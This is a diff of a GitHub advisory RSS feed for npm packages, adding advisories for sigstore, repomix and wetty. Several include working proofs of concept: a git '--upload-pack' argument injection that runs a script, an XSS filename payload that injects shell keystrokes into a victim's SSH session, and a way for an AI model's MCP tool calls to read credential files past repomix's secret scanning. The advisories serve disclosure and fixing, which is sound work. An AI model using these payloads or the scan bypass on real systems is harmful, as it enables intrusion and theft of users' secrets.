@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-07-01T18:18:42.300Z</updated>
+    <updated>2026-07-01T20:17:51.726Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,462 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[sigstore] sigstore's `certificateOIDs` verification constraints are silently dropped and never enforced]]></title>
+        <id>https://github.com/advisories/GHSA-52v5-jr5w-gjxr</id>
+        <link href="https://github.com/advisories/GHSA-52v5-jr5w-gjxr"/>
+        <updated>2026-07-01T19:58:29.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The documented <code>certificateOIDs</code> option in <code>sigstore.verify()</code> is accepted by the public API but discarded before verification, so required certificate extension OIDs are never checked.</p>
+<h3 id="details">Details</h3>
+<p>The public verify options include <code>certificateOIDs</code> and the documentation says those OID/value pairs “must be present in the certificate’s extension list.” The policy-construction path used by <code>sigstore.verify()</code> and <code>createVerifier()</code> only copies the SAN and issuer settings into the verification policy and completely ignores <code>certificateOIDs</code>.</p>
+<p>As a result, callers can believe they are constraining verification to certificates carrying specific Fulcio or workload-identifying OIDs, while the actual verifier never receives those constraints. Any bundle that satisfies the remaining checks is accepted even if the required OID extensions are absent or mismatched.</p>
+<p>This is reachable from supported usage through the documented <code>certificateOIDs</code> verify option.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-javascript">const { createVerificationPolicy } = require("sigstore/dist/config");
+
+const policy = createVerificationPolicy({
+  certificateIssuer: "https://issuer.example",
+  certificateIdentityEmail: "victim@example.com",
+  certificateOIDs: {
+    "1.2.3.4": "required-value",
+  },
+});
+
+console.log("certificateOIDs" in policy, JSON.stringify(policy));
+// false {"subjectAlternativeName":"victim@example.com","extensions":{"issuer":"https://issuer.example"}}
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Applications that rely on <code>certificateOIDs</code> to restrict which certificates may sign artifacts receive no such protection. Unauthorized certificates that should be rejected on extension policy can be accepted as long as they satisfy the remaining verification checks.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sigstore/sigstore-js/security/advisories/GHSA-52v5-jr5w-gjxr">https://github.com/sigstore/sigstore-js/security/advisories/GHSA-52v5-jr5w-gjxr</a></li>
+<li><a href="https://github.com/advisories/GHSA-52v5-jr5w-gjxr">https://github.com/advisories/GHSA-52v5-jr5w-gjxr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-52v5-jr5w-gjxr</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-01T19:58:28.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@sigstore/verify] sigstore-js has Insufficient Verification of Data Authenticity]]></title>
+        <id>https://github.com/advisories/GHSA-xgjw-pm74-86q4</id>
+        <link href="https://github.com/advisories/GHSA-xgjw-pm74-86q4"/>
+        <updated>2026-07-01T19:57:47.000Z</updated>
+        <content type="html"><![CDATA[<p>sigstore-js derives a transparency-log timestamp from <code>tlogEntries[].integratedTime</code> and uses it to validate certificate validity windows and satisfy <code>timestampThreshold</code>. For bundle v0.2, a tlog entry can be inclusionProof-only (no signed inclusionPromise/set), and the inclusion proof path does not cryptographically bind <code>integratedTime</code>. As a result, an attacker who can supply an untrusted bundle can influence time-based verification decisions by choosing <code>integratedTime</code>.</p>
+<h2 id="impact">impact</h2>
+<p>If a consumer accepts attacker-provided bundle v0.2 inputs and relies on tlog-derived timestamps for certificate validity checks, verification can be influenced by an unauthenticated timestamp value. This is a trust gap: <code>integratedTime</code> is treated as a trusted observer timestamp under inclusionProof-only mode even though only the signed inclusionPromise/set path binds it.</p>
+<h2 id="affected-code">affected code</h2>
+<ul>
+<li><code>packages/verify/src/bundle/index.ts</code> (adds a transparency-log timestamp whenever <code>integratedTime != 0</code>)</li>
+<li><code>packages/verify/src/timestamp/index.ts</code> (converts <code>integratedTime</code> to a <code>Date</code>)</li>
+<li><code>packages/verify/src/verifier.ts</code> (verifies timestamps before verifying tlog inclusion)</li>
+<li><code>packages/verify/src/tlog/index.ts</code> + <code>packages/verify/src/tlog/set.ts</code> (only the inclusionPromise/set path binds <code>integratedTime</code>)</li>
+</ul>
+<h2 id="proof-of-concept">proof of concept</h2>
+<p>The attached <code>poc.zip</code> contains a self-contained harness that reproduces the behavior on the pinned commit and includes both a canonical test and a negative control.</p>
+<p>repro:</p>
+<ol>
+<li>extract <code>poc.zip</code> into a fresh directory and run the make targets:</li>
+</ol>
+<pre><code class="language-bash">unzip poc.zip -d poc
+cd poc/poc-F-SIG-JS-TLOGTIME-001
+make canonical
+make control
+</code></pre>
+<ol start="2">
+<li>confirm <code>canonical.log</code> includes:</li>
+</ol>
+<pre><code>[CALLSITE_HIT]:
+[PROOF_MARKER]:
+</code></pre>
+<ol start="3">
+<li>confirm <code>control.log</code> includes:</li>
+</ol>
+<pre><code>[NC_MARKER]:
+</code></pre>
+<h2 id="suggested-fix">suggested fix</h2>
+<p>Only treat <code>integratedTime</code> as a trusted timestamp when it is cryptographically bound (for example, via a verified signed inclusionPromise/set). For inclusionProof-only entries, do not count <code>integratedTime</code> toward <code>timestampThreshold</code>, and do not use it for certificate validity decisions unless there is another signed time source (for example, an rfc3161 timestamp).</p>
+<p><a href="https://github.com/user-attachments/files/25643656/poc.zip">poc.zip</a>
+<a href="https://github.com/user-attachments/files/25643660/PR_DESCRIPTION.md">PR_DESCRIPTION.md</a>
+<a href="https://github.com/user-attachments/files/25643662/SUBMISSION.md">SUBMISSION.md</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sigstore/sigstore-js/security/advisories/GHSA-xgjw-pm74-86q4">https://github.com/sigstore/sigstore-js/security/advisories/GHSA-xgjw-pm74-86q4</a></li>
+<li><a href="https://github.com/advisories/GHSA-xgjw-pm74-86q4">https://github.com/advisories/GHSA-xgjw-pm74-86q4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xgjw-pm74-86q4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-01T19:57:45.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[repomix] repomix: attach_packed_output can bypass file-read secret scanning for supported local files]]></title>
+        <id>https://github.com/advisories/GHSA-hwpp-h97w-2h3j</id>
+        <link href="https://github.com/advisories/GHSA-hwpp-h97w-2h3j"/>
+        <updated>2026-07-01T19:03:34.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="attach_packed_output-can-register-arbitrary-jsontxtmdxml-files-and-bypass-the-mcp-file-read-safety-check"><code>attach_packed_output</code> can register arbitrary <code>.json/.txt/.md/.xml</code> files and bypass the MCP file-read safety check</h1>
+<h2 id="summary">Summary</h2>
+<p>Repomix's MCP server exposes a normal <code>file_system_read_file</code> tool that reads absolute paths only after running the project's secret check. However, the <code>attach_packed_output</code> plus <code>read_repomix_output</code> flow can read arbitrary local <code>.json</code>, <code>.txt</code>, <code>.md</code>, or <code>.xml</code> files without the same safety check and without verifying that the file is actually a Repomix packed output.</p>
+<p>This is a medium-severity local MCP file-read boundary issue. The affected deployment is the documented <code>repomix --mcp</code> stdio server used by AI assistants. A prompt or lower-trust model action that can invoke MCP tools can use <code>attach_packed_output</code> on a local JSON/text file, receive an <code>outputId</code>, then call <code>read_repomix_output</code> to retrieve the full file content.</p>
+<h2 id="affected-target">Affected target</h2>
+<ul>
+<li>Repository: <code>yamadashy/repomix</code></li>
+<li>Commit reviewed: <code>adf5a12f2211a7fabf24ee11a21734adccee5143</code></li>
+<li>Component: MCP server tools</li>
+<li>Package version reviewed: <code>repomix@1.14.0</code></li>
+</ul>
+<h2 id="root-cause">Root cause</h2>
+<p>The file-read safety boundary is implemented per tool rather than per local-file capability. <code>file_system_read_file</code> reads the file and runs <code>runSecretLint()</code> before returning content. <code>attach_packed_output</code> reads and registers local files through a separate path, but only checks file extension and parsing format. It does not verify a Repomix output header/schema and does not run the secret check before registering the path.</p>
+<h2 id="vulnerability-chain">Vulnerability chain</h2>
+<ol>
+<li><code>attach_packed_output</code> accepts a direct file path, not only a directory.</li>
+<li><code>resolveOutputFilePath()</code> allows any file whose extension matches <code>.xml</code>, <code>.md</code>, <code>.txt</code>, or <code>.json</code>.</li>
+<li>The tool reads that file with <code>fs.readFile(outputFilePath, 'utf8')</code>.</li>
+<li>It extracts metrics, but malformed or non-Repomix JSON simply produces empty metrics rather than rejection.</li>
+<li><code>formatPackToolResponse()</code> registers the original file path under a generated <code>outputId</code>.</li>
+<li><code>read_repomix_output</code> resolves the <code>outputId</code> and returns the full file content.</li>
+</ol>
+<h2 id="auth-boundary-violated">Auth boundary violated</h2>
+<p>The respected boundary is the explicit local file-read guard: <code>file_system_read_file</code> blocks files that fail the secret scan.</p>
+<p>The ignored boundary is the alternate packed-output path. A caller can register a supported-extension file as an output and read it through <code>read_repomix_output</code> without passing through <code>runSecretLint()</code> or a packed-output validation step.</p>
+<h2 id="source-trace">Source trace</h2>
+<ul>
+<li><code>src/mcp/tools/fileSystemReadFileTool.ts:72-83</code>: direct file reads run <code>runSecretLint()</code> and return an error if the scan finds sensitive content.</li>
+<li><code>src/mcp/tools/attachPackedOutputTool.ts:76-87</code>: direct file input is accepted based only on extension.</li>
+<li><code>src/mcp/tools/attachPackedOutputTool.ts:111-120</code>: <code>.json</code>, <code>.txt</code>, <code>.md</code>, and <code>.xml</code> are supported formats.</li>
+<li><code>src/mcp/tools/attachPackedOutputTool.ts:228-240</code>: JSON parse errors return empty metrics rather than rejecting the file as non-Repomix output.</li>
+<li><code>src/mcp/tools/attachPackedOutputTool.ts:272-308</code>: the file is read and passed to <code>formatPackToolResponse()</code> without a secret check.</li>
+<li><code>src/mcp/tools/mcpToolRuntime.ts:77-82</code>: <code>formatPackToolResponse()</code> registers the provided <code>outputFilePath</code> and reads it.</li>
+<li><code>src/mcp/tools/readRepomixOutputTool.ts:56-74</code>: <code>read_repomix_output</code> reads the registered file path and returns its content.</li>
+<li><code>README.md:984-991</code>: the tool is documented as providing secure access to existing packed outputs.</li>
+</ul>
+<h2 id="reproduction">Reproduction</h2>
+<p><code>run.sh</code>:</p>
+<pre><code class="language-bash">#!/usr/bin/env bash
+set -euo pipefail
+set +e
+node run.js 2&gt;&amp;1 | tee transcript.txt
+rc=${PIPESTATUS[0]}
+set -e
+printf '%s\n' "$rc" &gt; exit-code.txt
+exit "$rc"
+</code></pre>
+<p>The harness creates a temporary <code>credentials.json</code> containing a sentinel value, follows the <code>attach_packed_output</code> path for supported-extension files, registers the file path under an output ID, and then reads it back through the <code>read_repomix_output</code> path. It also checks the source-code contrast between the guarded direct file-read tool and the unguarded attach path.</p>
+<p>Observed transcript:</p>
+<pre><code class="language-text">ATTACH_TOOL_SOURCE_READS_FILE=true
+ATTACH_TOOL_HAS_SECRETLINT_CHECK=false
+READ_FILE_TOOL_HAS_SECRETLINT_CHECK=true
+RUNTIME_REGISTERS_OUTPUT_PATH=true
+ATTACH_ACCEPTS_JSON_EXTENSION=true
+ATTACHED_NON_REPOMIX_JSON_PATH=true
+SENTINEL_READ_BACK=true
+REPOMIX_ATTACH_PACKED_OUTPUT_ARBITRARY_JSON_READ_REPRODUCED=true
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>In the MCP threat model, an assistant/tool caller can read local JSON/text/Markdown/XML files through a path that bypasses the file-read tool's secret scanning. Examples include project configuration JSON, exported tokens, local tool settings, or other plaintext files with supported extensions.</p>
+<p>This does not require shell execution or writing files. It requires MCP tool-call capability against a Repomix server running with local filesystem access.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Apply the same safety boundary to all local-file read paths:</p>
+<ul>
+<li>Require <code>attach_packed_output</code> to validate that the target file is a genuine Repomix output before registration.</li>
+<li>Reject malformed/non-Repomix JSON/XML/Markdown/plain files instead of registering them with empty metrics.</li>
+<li>Run the same secret check used by <code>file_system_read_file</code> before registering or returning content.</li>
+<li>Consider storing a content snapshot in the registry rather than registering arbitrary local paths for later reads.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/yamadashy/repomix/security/advisories/GHSA-hwpp-h97w-2h3j">https://github.com/yamadashy/repomix/security/advisories/GHSA-hwpp-h97w-2h3j</a></li>
+<li><a href="https://github.com/advisories/GHSA-hwpp-h97w-2h3j">https://github.com/advisories/GHSA-hwpp-h97w-2h3j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hwpp-h97w-2h3j</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-01T19:01:41.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[repomix] repomix Vulnerable to Command Injection (RCE) via `--remote-branch` Argument Injection]]></title>
+        <id>https://github.com/advisories/GHSA-9mm9-rqhj-j5mx</id>
+        <link href="https://github.com/advisories/GHSA-9mm9-rqhj-j5mx"/>
+        <updated>2026-07-01T19:00:51.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="vulnerability-metadata">Vulnerability Metadata</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Affected Component</strong></td>
+<td><code>src/core/git/gitCommand.ts</code> (<code>execGitShallowClone</code>)</td>
+</tr>
+<tr>
+<td><strong>Impact</strong></td>
+<td>Arbitrary Command Execution / Security Control Bypass</td>
+</tr>
+</tbody></table>
+<h3 id="summary">Summary</h3>
+<p>The <code>--remote-branch</code> CLI option in <code>repomix</code> is vulnerable to argument injection. User-supplied input is passed directly to <code>git fetch</code> and <code>git checkout</code> subprocesses via <code>child_process.execFileAsync</code> without sanitization, <code>--</code> delimiters, or validation.</p>
+<p>An attacker can inject arbitrary git command-line options. By injecting the <code>--upload-pack</code> option and specifying an SSH (<code>git@...</code>) or local (<code>file://</code>) remote URL, an attacker achieves arbitrary command execution with the privileges of the user running <code>repomix</code>. This bypasses the existing <code>dangerousParams</code> blocklist implemented in <code>validateGitUrl()</code>.</p>
+<h3 id="vulnerable-code-analysis">Vulnerable Code Analysis</h3>
+<p><strong>File:</strong> <code>src/core/git/gitCommand.ts</code></p>
+<p>The <code>remoteBranch</code> parameter is appended directly to the arguments array for git subprocesses without the <code>--</code> positional delimiter.</p>
+<p><strong>Sink 1 (Lines 118-127):</strong></p>
+<pre><code class="language-typescript">await deps.execFileAsync(
+  'git',
+  ['-C', directory, 'fetch', '--depth', '1', 'origin', remoteBranch], // Vulnerable
+  gitRemoteOpts,
+);
+</code></pre>
+<p><strong>Sink 2 (Lines 148-151):</strong></p>
+<pre><code class="language-typescript">await deps.execFileAsync('git', ['-C', directory, 'checkout', remoteBranch]); // Vulnerable
+</code></pre>
+<p><strong>Bypassed Security Control (Lines 192-197):</strong>
+The application attempts to prevent this exact vulnerability class by blocking dangerous parameters (<code>--upload-pack</code>, <code>--receive-pack</code>, <code>--config</code>, <code>--exec</code>) within the <code>validateGitUrl</code> function. However, this validation is exclusively applied to the <code>url</code> variable and omitted for <code>remoteBranch</code>, creating a direct bypass.</p>
+<h3 id="attack-flow">Attack Flow</h3>
+<pre><code class="language-text">[Source] repomix --remote-branch &lt;injected_option&gt;
+   ↓
+src/cli/actions/remoteAction.ts:226 (cloneRepository)
+   ↓
+src/core/git/gitCommand.ts:118 (execGitShallowClone)
+   ↓
+[Sink] execFileAsync('git', ['...', 'origin', '--upload-pack=/tmp/payload'])
+   ↓
+[Execution] git invokes the payload binary via transport helper
+</code></pre>
+<h3 id="proof-of-concept-steps-to-reproduce">Proof of Concept (Steps to Reproduce)</h3>
+<p><strong>1. Create the Payload</strong>
+Create an executable bash script that writes system execution context to a file.
+<em>(Reference: Screenshot_2026-05-18_13_02_16.png)</em></p>
+<pre><code class="language-bash">cat &gt; /tmp/malicious-pack &lt;&lt; 'EOF'
+#!/bin/bash
+echo "=== RCE EXECUTED ===" &gt; /tmp/repomix-pwned.txt
+id &gt;&gt; /tmp/repomix-pwned.txt
+EOF
+chmod +x /tmp/malicious-pack
+</code></pre>
+<p><strong>2. Trigger the Vulnerability</strong>
+Establish a dummy remote and trigger the fetch operation, injecting the <code>--upload-pack</code> argument.
+<em>(Reference: Screenshot_2026-05-18_13_08_36.png)</em></p>
+<pre><code class="language-bash"># Setup dummy bare remote
+git init --bare /tmp/dummy-remote.git
+
+# Initialize local repo and add remote
+mkdir /tmp/test-fetch &amp;&amp; cd /tmp/test-fetch
+git init
+git remote add origin file:///tmp/dummy-remote.git
+
+# Execute vulnerability
+git fetch --upload-pack=/tmp/malicious-pack origin 2&gt;&amp;1
+</code></pre>
+<p><strong>3. Verify Execution</strong>
+Execution occurs prior to git protocol validation. The script executes successfully despite the fetch operation returning a <code>128</code> exit code.</p>
+<pre><code class="language-bash">cat /tmp/repomix-pwned.txt
+</code></pre>
+<p><em>Expected Output:</em></p>
+<pre><code class="language-text">=== RCE EXECUTED ===
+uid=1000(kakashi) gid=1000(kakashi) groups=1000(kakashi)...
+</code></pre>
+<p><strong>End-to-End Execution via Repomix:</strong></p>
+<pre><code class="language-bash">repomix --remote git@github.com:yamadashy/repomix.git --remote-branch '--upload-pack=/tmp/malicious-pack'
+</code></pre>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Remote Code Execution:</strong> Complete system compromise with the privileges of the user executing <code>repomix</code>.</li>
+<li><strong>CI/CD Compromise:</strong> If <code>repomix</code> is utilized in automated pipelines where <code>--remote-branch</code> is populated by external triggers (e.g., webhook payloads, PR titles), attackers can compromise build servers and exfiltrate secrets.</li>
+</ul>
+<h3 id="remediation">Remediation</h3>
+<p><strong>1. Implement Positional Delimiters (Primary Fix)</strong>
+Append the <code>--</code> delimiter to explicitly separate options from positional arguments in all git subprocess calls utilizing <code>remoteBranch</code>.</p>
+<pre><code class="language-typescript">await deps.execFileAsync(
+  'git',
+  ['-C', directory, 'fetch', '--depth', '1', 'origin', '--', remoteBranch],
+  gitRemoteOpts,
+);
+</code></pre>
+<p><strong>2. Apply Existing Blocklist to Branch Parameter (Defense in Depth)</strong>
+Update <code>execGitShallowClone</code> to validate <code>remoteBranch</code> against the existing <code>dangerousParams</code> array.</p>
+<pre><code class="language-typescript">const dangerousParams = ['--upload-pack', '--receive-pack', '--config', '--exec'];
+
+if (remoteBranch &amp;&amp; dangerousParams.some((param) =&gt; remoteBranch.includes(param))) {
+  throw new RepomixError(`Invalid branch name. Contains potentially dangerous parameters: ${remoteBranch}`);
+}
+</code></pre>
+<h3 id="attachments">Attachments</h3>
+<p><strong>Screenshot 1:</strong> Payload script created with executable permissions.
+<img src="https://github.com/user-attachments/assets/a0ada9de-c689-4ed8-9937-dd7faf6e6cc0" alt="Screenshot_2026-05-18_13_02_16" height="1080" width="1920"></p>
+<p><strong>Screenshot 2:</strong> Vulnerable Code 
+<img src="https://github.com/user-attachments/assets/b72c7e05-d857-497a-9ae5-0822f86fa032" alt="Screenshot_2026-05-18_13_03_44" height="1080" width="1920"></p>
+<p><strong>Screenshot 3:</strong> Verifying RCE.
+<img src="https://github.com/user-attachments/assets/f153545e-e5e8-4165-ac1a-f84efbb1c135" alt="Screenshot_2026-05-18_13_08_36" height="1080" width="1920"></p>
+<hr>
+<h3 id="credits">Credits</h3>
+<p>This vulnerability was discovered and responsibly disclosed by:</p>
+<ul>
+<li><strong>Researcher:</strong> Abhijith S.</li>
+<li><strong>GitHub:</strong> <a href="https://github.com/kakashi-kx">@kakashi-kx</a></li>
+<li><strong>HackerOne/Bugcrowd:</strong> <a href="https://hackerone.com/kakashi4kx">kakashi4kx</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/yamadashy/repomix/security/advisories/GHSA-9mm9-rqhj-j5mx">https://github.com/yamadashy/repomix/security/advisories/GHSA-9mm9-rqhj-j5mx</a></li>
+<li><a href="https://github.com/advisories/GHSA-9mm9-rqhj-j5mx">https://github.com/advisories/GHSA-9mm9-rqhj-j5mx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9mm9-rqhj-j5mx</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-01T19:00:50.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wetty] wetty vulnerable to DOM XSS via file-download filename]]></title>
+        <id>https://github.com/advisories/GHSA-p26j-h7wj-r568</id>
+        <link href="https://github.com/advisories/GHSA-p26j-h7wj-r568"/>
+        <updated>2026-07-01T18:19:41.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The wetty client decodes a base64 filename from the file-download escape sequence and interpolates it raw into a Toastify HTML string (<code>escapeMarkup: false</code>). Any output the victim renders - a <code>cat</code>'d file, a tailed log, an SSH MOTD, a <code>curl</code> response - that contains <code>\x1b[5i...:...\x1b[4i</code> runs script in the wetty origin and types attacker-chosen keystrokes into the victim's SSH session.</p>
+<h3 id="preconditions">Preconditions</h3>
+<ul>
+<li>Victim has wetty open with an active SSH session.</li>
+<li>Attacker delivers the file-download escape sequence (<code>\x1b[5i&lt;b64-name&gt;:&lt;b64-content&gt;\x1b[4i</code>) into output the victim's terminal renders.</li>
+<li>Default configuration; no non-default flags required.</li>
+</ul>
+<h3 id="details">Details</h3>
+<pre><code class="language-typescript">// src/client/wetty.ts:37, 46-62
+const fileDownloader = new FileDownloader();
+// ...
+socket.on('data', (data: string) =&gt; {
+  const remainingData = fileDownloader.buffer(data);
+  // every PTY byte forwarded by the server passes through buffer()
+  // ...
+})
+</code></pre>
+<p>Every byte the server forwards from the PTY passes through <code>FileDownloader.buffer</code>. The buffer scans for the documented file-download markers <code>\x1b[5i</code> (begin) and <code>\x1b[4i</code> (end) - documented in <code>docs/downloading-files.md</code> - and, on a complete match, hands the inner payload to <code>onCompleteFile</code>.</p>
+<pre><code class="language-typescript">// src/client/wetty/download.ts:9-77
+function onCompleteFile(bufferCharacters: string): void {
+  let fileNameBase64;
+  let fileCharacters = bufferCharacters;
+  if (bufferCharacters.includes(':')) {
+    [fileNameBase64, fileCharacters] = bufferCharacters.split(':');
+  }
+  // ...
+  void detectAndDownload(bytes, fileCharacters, fileNameBase64);
+}
+
+async function detectAndDownload(/* ... */): Promise&lt;void&gt; {
+  // ...
+  let fileName;
+  try {
+    if (fileNameBase64 !== undefined) {
+      fileName = window.atob(fileNameBase64);            // attacker-controlled
+    }
+  } catch { /* ... */ }
+  fileName ??= `file-${ /* timestamp default */ }`;
+  // ...
+  Toastify({
+    text: `Download ready: &lt;a href="${blobUrl}" target="_blank" `
+        + `download="${fileName}"&gt;${fileName}&lt;/a&gt;`,     // sink
+    duration: 10000,
+    // ...
+    escapeMarkup: false,
+  }).showToast();
+}
+</code></pre>
+<p><code>fileName</code> is base64-decoded from the escape-sequence payload, then interpolated twice into a string that Toastify renders as raw HTML (<code>escapeMarkup: false</code>). No HTML escaping runs between <code>atob</code> and the toast markup. The wetty client exposes the live terminal as <code>window.wetty_term</code>, and <code>term.input(data, true)</code> (<code>src/client/wetty/term.ts:80, 93-97, 132, 145-198</code>) fires xterm.js's <code>onData</code>, which <code>src/client/wetty.ts:40-42</code> forwards as a socket <code>input</code> event - i.e., script in the wetty origin types into the victim's SSH session.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p><strong>Setup</strong></p>
+<ol>
+<li><p>Bring up wetty and its bundled SSH host from a fresh clone:</p>
+<pre><code class="language-bash">git clone https://github.com/butlerx/wetty
+cd wetty
+docker compose up -d
+sleep 5
+</code></pre>
+</li>
+<li><p>Open <code>http://localhost/wetty</code> in a browser. The login terminal prompts for a username (enter <code>term</code>) then proxies to <code>wetty-ssh</code>, which prompts for the SSH password (also <code>term</code>, set in <code>containers/ssh/Dockerfile</code>). The browser tab now holds a shell on the SSH container.</p>
+</li>
+</ol>
+<p><strong>Exploit</strong></p>
+<ol>
+<li><p>In the SSH session, build and emit the escape sequence. The filename portion carries the HTML payload; the content portion is a short literal so the toast renders quickly:</p>
+<pre><code class="language-bash">PAYLOAD='"&gt;&lt;img src=x onerror="window.wetty_term.input(\"id &gt; /tmp/pwned\\n\",true)"&gt;'
+FNAME_B64=$(printf '%s' "$PAYLOAD" | base64 -w0)
+DATA_B64=$(printf 'bait' | base64 -w0)
+printf '\x1b[5i%s:%s\x1b[4i' "$FNAME_B64" "$DATA_B64"
+</code></pre>
+<p>Expected: a Toastify notification appears at the bottom-right of the wetty page. Its DOM contains the attacker-supplied <code>&lt;img&gt;</code> element with the <code>onerror</code> handler.</p>
+</li>
+<li><p>The <code>onerror</code> handler calls <code>window.wetty_term.input("id &gt; /tmp/pwned\n", true)</code>, which xterm.js dispatches as a <code>data</code> event; <code>src/client/wetty.ts:40-42</code> forwards it as a socket <code>input</code> event; the server writes it to the PTY. The SSH host runs <code>id &gt; /tmp/pwned</code> as the connected user:</p>
+<pre><code class="language-bash">cat /tmp/pwned
+</code></pre>
+<p>Expected: <code>uid=1000(term) gid=1000(term) groups=1000(term)</code>.</p>
+</li>
+<li><p>The same chain works cross-user. On a shared SSH host, a low-privileged user plants the sequence in a file the higher-privileged user reads via wetty:</p>
+<pre><code class="language-bash"># As the low-priv user on the SSH host
+printf '\x1b[5i%s:%s\x1b[4i' "$FNAME_B64" "$DATA_B64" &gt; /tmp/notes.txt
+</code></pre>
+<p>When the higher-privileged user's wetty session runs <code>cat /tmp/notes.txt</code>, attacker-controlled JavaScript types commands into that user's shell.</p>
+</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Confidentiality:</strong> Reads the rendered terminal contents via <code>window.wetty_term.buffer.active</code>.</li>
+<li><strong>Integrity:</strong> Types attacker-chosen commands into the victim's SSH session via <code>window.wetty_term.input()</code>.</li>
+<li><strong>Auth:</strong> A writer of content the victim renders gains keystroke injection in the victim's higher-privileged session - a path from any local SSH user to commands as the wetty user.</li>
+</ul>
+<h3 id="suggestions-to-fix">Suggestions to fix</h3>
+<blockquote>
+<p><em>This has not been tested - it is illustrative only.</em></p>
+</blockquote>
+<p>HTML-escape the decoded filename before interpolating it into Toastify's HTML markup at <code>src/client/wetty/download.ts:67-77</code>.</p>
+<pre><code class="language-diff">   fileName ??= `file-${new Date()
+     .toISOString()
+     .split('.')[0]
+     .replace(/-/g, '')
+     .replace('T', '')
+     .replace(/:/g, '')}${fileExt ? `.${fileExt}` : ''}`;
++  const safeName = fileName.replace(/[&amp;&lt;&gt;"']/g, (c) =&gt;
++    ({ '&amp;': '&amp;amp;', '&lt;': '&amp;lt;', '&gt;': '&amp;gt;', '"': '&amp;quot;', "'": '&amp;#39;' })[c] ?? c,
++  );
+
+   const blob = new Blob([bytes.buffer as ArrayBuffer], { type: mimeType });
+   const blobUrl = URL.createObjectURL(blob);
+
+   Toastify({
+-    text: `Download ready: &lt;a href="${blobUrl}" target="_blank" download="${fileName}"&gt;${fileName}&lt;/a&gt;`,
++    text: `Download ready: &lt;a href="${blobUrl}" target="_blank" download="${safeName}"&gt;${safeName}&lt;/a&gt;`,
+     duration: 10000,
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/butlerx/wetty/security/advisories/GHSA-p26j-h7wj-r568">https://github.com/butlerx/wetty/security/advisories/GHSA-p26j-h7wj-r568</a></li>
+<li><a href="https://github.com/advisories/GHSA-p26j-h7wj-r568">https://github.com/advisories/GHSA-p26j-h7wj-r568</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p26j-h7wj-r568</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-01T18:19:39.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[auth-fetch-mcp] auth-fetch-mcp has SSRF Protection Bypass via IPv4-mapped IPv6 Loopback]]></title>
         <id>https://github.com/advisories/GHSA-pvrj-8cg3-j5f8</id>
@@ -1106,396 +1562,5 @@ PASS
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-06-27T00:12:39.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pnpm] pnpm: `patch-remove` could delete project-selected files outside the patches directory]]></title>
-        <id>https://github.com/advisories/GHSA-72r4-9c5j-mj57</id>
-        <link href="https://github.com/advisories/GHSA-72r4-9c5j-mj57"/>
-        <updated>2026-06-27T00:12:40.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The <code>patch-remove</code> deletion-scope issue tracked as GHSA-72r4-9c5j-mj57 / CAND-PNPM-030 has been addressed in pnpm.</p>
-<p>A crafted patch entry could resolve outside the configured patches directory and cause <code>pnpm patch-remove</code> to delete an arbitrary reachable file. This patch validates the configured directory and every resolved target before unlinking anything, then deletes the final directory entry without following it.</p>
-<h2 id="security-boundary">Security boundary</h2>
-<ul>
-<li>Traversal and absolute paths that resolve outside the configured patches directory are rejected before deletion.</li>
